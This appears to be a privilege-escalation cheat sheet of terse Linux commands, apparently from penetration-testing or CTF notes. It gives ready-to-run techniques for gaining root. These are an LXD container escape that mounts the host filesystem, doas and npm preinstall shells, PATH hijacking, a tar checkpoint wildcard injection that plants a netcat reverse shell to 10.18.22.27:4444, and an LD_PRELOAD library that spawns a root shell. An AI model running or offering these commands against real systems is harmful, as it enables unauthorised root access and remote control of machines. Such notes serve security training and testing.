#### LXD container exploitation

```bash
wget archive
lxc image import ./lxd.tar.gz --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true # If not working, use FINGERPRINT
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

```sh
Would you like to use LXD clustering? (yes/no) [default=no]: no
Do you want to configure a new storage pool? (yes/no) [default=yes]: yes
Name of the new storage pool [default=default]: 
Name of the storage backend to use (btrfs, dir, lvm) [default=btrfs]: dir
Would you like to connect to a MAAS server? (yes/no) [default=no]: no
Would you like to create a new network bridge? (yes/no) [default=yes]: yes
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: none
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
ubuntu@ajkavanagh-bionic-test:~$ lxc storage list
```
#### with doas

```bash
doas -u root openssl enc -in file
doas -u root /bin/bash
```
#### with npm -u

```bash
mkdir ~/tmp
echo '{"scripts": {"preinstall": "/bin/sh"}}' > ~/tmp/package.json
sudo -u serv-manage /usr/bin/npm -C ~/tmp/ --unsafe-perm i
```
#### PATH

```bash
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
./app_that_calls_curl
```

#### tar

```bash
cat > /home/andre/backup/rev << EOF
#!/bin/bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
EOF
echo "" > "/home/andre/backup/--checkpoint=1"
echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev"
chmod +x rev
```
#### env_keep += LD_PRELOAD

```bash
cd /tmp
cat > shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
EOF
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
```